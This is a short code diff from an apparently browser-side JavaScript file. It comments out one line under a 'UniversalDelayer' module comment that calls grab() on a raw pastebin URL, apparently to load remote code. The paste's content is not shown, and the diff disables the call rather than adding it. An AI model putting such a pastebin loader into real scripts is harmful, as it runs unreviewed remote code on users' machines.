@@ -855,4 +855,4 @@ function noopFunc() {};
 })();
 
 // JS __UniversalDelayer_Modul
-grab(https://pastebin.com/raw/Rhu09X97)
+//grab(https://pastebin.com/raw/Rhu09X97)
